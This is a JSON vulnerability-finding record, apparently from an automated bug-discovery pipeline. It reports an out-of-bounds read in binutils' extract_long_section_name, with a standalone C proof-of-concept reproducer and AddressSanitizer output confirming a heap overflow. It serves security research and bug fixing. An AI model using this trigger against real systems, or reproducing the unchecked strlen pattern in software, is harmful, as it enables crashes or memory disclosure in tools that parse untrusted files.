@@ -1,0 +1,69 @@
+{
+  "baseline": "B3",
+  "vulnerability": {
+    "file": "bfd/coffgen.c",
+    "line": 64,
+    "function": "extract_long_section_name",
+    "bug_type": "out-of-bounds-read",
+    "cwe": "CWE-125",
+    "confidence": "high",
+    "explanation": "The code calls strlen(strings) on data taken from the COFF string table after only checking (strindex + 2) < table_length. This does not guarantee a NUL terminator exists before the end of the string table. A crafted file with a non-terminated string at the given offset causes strlen (and the subsequent strcpy) to read past the allocated string table buffer.",
+    "abs_path": "/tmp/binutils_upstream/bfd/coffgen.c"
+  },
+  "reproducer_code": "// Standalone reproducer for OOB read in extract_long_section_name\n// CWE-125: Out-of-bounds Read\n// This program stubs minimal parts of BFD needed to call the vulnerable function\n// and crafts a string table without a NUL terminator at the checked offset.\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdint.h>\n\ntypedef size_t bfd_size_type;\n\ntypedef struct bfd {\n    char *string_table;\n    bfd_size_type string_table_len;\n} bfd;\n\n// Stubs for the BFD helpers used by extract_long_section_name\nstatic const char * _bfd_coff_read_string_table(bfd *abfd) {\n    return abfd->string_table;\n}\n\nstatic bfd_size_type obj_coff_strings_len(bfd *abfd) {\n    return abfd->string_table_len;\n}\n\nstatic void * bfd_alloc(bfd *abfd, bfd_size_type size) {\n    (void)abfd; // unused in this stub\n    return malloc(size);\n}\n\n// Vulnerable function copied/adapted from bfd/coffgen.c\nstatic char *\nextract_long_section_name(bfd *abfd, unsigned long strindex)\n{\n    const char *strings;\n    char *name;\n\n    strings = _bfd_coff_read_string_table (abfd);\n    if (strings == NULL)\n        return NULL;\n    if ((bfd_size_type)(strindex + 2) >= obj_coff_strings_len (abfd))\n        return NULL;\n    strings += strindex;\n    // BUG: strlen can run past the end of the string table if no NUL is present\n    name = (char *) bfd_alloc (abfd, (bfd_size_type) strlen (strings) + 1);\n    if (name == NULL)\n        return NULL;\n    strcpy (name, strings);\n\n    return name;\n}\n\nint main(void) {\n    // Create a fake BFD with a string table that lacks a NUL terminator\n    // at and after the chosen strindex. This satisfies the bounds check\n    // (strindex + 2) < table_length but forces strlen to read past the end.\n    bfd abfd;\n\n    const bfd_size_type table_len = 32; // any length >= 3\n    abfd.string_table = (char *)malloc(table_len);\n    if (!abfd.string_table) {\n        perror(\"malloc\");\n        return 1;\n    }\n    abfd.string_table_len = table_len;\n\n    // Fill the table with non-NUL bytes to ensure no terminator is present\n    memset(abfd.string_table, 'A', table_len);\n\n    // Choose an index that passes the check: (strindex + 2) < table_len\n    // For table_len=32, strindex=29 satisfies 29+2=31 < 32\n    unsigned long strindex = table_len - 3; // 29\n\n    fprintf(stderr, \"Triggering OOB read: table_len=%zu, strindex=%lu\\n\",\n            (size_t)table_len, strindex);\n\n    // This call should trigger an ASan out-of-bounds read in strlen\n    char *name = extract_long_section_name(&abfd, strindex);\n\n    // If the bug did not trigger (e.g., ASan not enabled), clean up\n    if (name) free(name);\n    free(abfd.string_table);\n\n    return 0;\n}\n",
+  "validation": {
+    "verdict": "CONCRETE_CONFIRMED",
+    "asan": {
+      "asan_triggered": true,
+      "exit_code": 1,
+      "elapsed": 0.6722323894500732,
+      "output": "Triggering OOB read: table_len=32, strindex=29\n=================================================================\n==3614728==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x603000000060 at pc 0x5b3a214218ca bp 0x7fffa56dd860 sp 0x7fffa56dd028\nREAD of size 4 at 0x603000000060 thread T0\n    #0 0x5b3a214218c9 in strlen (/app/se_runs/b3/binutils_b2bc71a_vul/findings/coffgen_64_out-of-bounds-read/reproducer+0x378c9) (BuildId: f0d23c9e287c271df0d75dd7bb668bf7f0a699f2)\n    #1 0x5b3a214cb031 in extract_long_section_name /app/se_runs/b3/binutils_b2bc71a_vul/findings/coffgen_64_out-of-bounds-read/reproducer.c:46:54\n    #2 0x5b3a214caed2 in main /app/se_runs/b3/binutils_b2bc71a_vul/findings/coffgen_64_out-of-bounds-read/reproducer.c:79:18\n    #3 0x7a63e1a2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #4 0x7a63e1a2a28a in __libc_start_main csu/../csu/libc-start.c:360:3\n    #5 0x5b3a2140b314 in _start (/app/se_runs/b3/binutils_b2bc71a_vul/findings/coffgen_64_out-of-bounds-read/reproducer+0x21314) (BuildId: f0d23c9e287c271df0d75dd7bb668bf7f0a699f2)\n\n0x603000000060 is located 0 bytes to the right of 32-byte region [0x603000000040,0x603000000060)\nallocated by thread T0 here:\n    #0 0x5b3a2148ed22 in __interceptor_malloc (/app/se_runs/b3/binutils_b2bc71a_vul/findings/coffgen_64_out-of-bounds-read/reproducer+0xa4d22) (BuildId: f0d23c9e287c271df0d75dd7bb668bf7f0a699f2)\n    #1 0x5b3a214cad8d in main /app/se_runs/b3/binutils_b2bc71a_vul/findings/coffgen_64_out-of-bounds-read/reproducer.c:61:33\n    #2 0x7a63e1a2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #3 0x7a63e1a2a28a in __libc_start_main csu/../csu/libc-start.c:360:3\n    #4 0x5b3a2140b314 in _start (/app/se_runs/b3/binutils_b2bc71a_vul/findings/coffgen_64_out-of-bounds-read/reproducer+0x21314) (BuildId: f0d23c9e287c271df0d75dd7bb668bf7f0a699f2)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow (/app/se_runs/b3/binutils_b2bc71a_vul/findings/coffgen_64_out-of-bounds-read/reproducer+0x378c9) (BuildId: f0d23c9e287c271df0d75dd7bb668bf7f0a699f2) in strlen\nShadow bytes around the buggy address:\n  0x0c067fff7fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c067fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c067fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c067fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c067fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=>0x0c067fff8000: fa fa 00 00 00 fa fa fa 00 00 00 00[fa]fa fa fa\n  0x0c067fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c067fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c067fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c067fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c067fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==3614728==ABORTING\n",
+      "error_type": "heap-buffer-overflow",
+      "frames": [
+        [
+          "1",
+          "extract_long_section_name",
+          "/app/se_runs/b3/binutils_b2bc71a_vul/findings/coffgen_64_out-of-bounds-read/reproducer.c:46",
+          "54"
+        ],
+        [
+          "2",
+          "main",
+          "/app/se_runs/b3/binutils_b2bc71a_vul/findings/coffgen_64_out-of-bounds-read/reproducer.c:79",
+          "18"
+        ],
+        [
+          "3",
+          "__libc_start_call_main",
+          "csu/../sysdeps/nptl/libc_start_call_main.h:58",
+          "16"
+        ],
+        [
+          "4",
+          "__libc_start_main",
+          "csu/../csu/libc-start.c:360",
+          "3"
+        ],
+        [
+          "1",
+          "main",
+          "/app/se_runs/b3/binutils_b2bc71a_vul/findings/coffgen_64_out-of-bounds-read/reproducer.c:61",
+          "33"
+        ],
+        [
+          "2",
+          "__libc_start_call_main",
+          "csu/../sysdeps/nptl/libc_start_call_main.h:58",
+          "16"
+        ],
+        [
+          "3",
+          "__libc_start_main",
+          "csu/../csu/libc-start.c:360",
+          "3"
+        ]
+      ],
+      "is_harness_artifact": false
+    }
+  }
+}
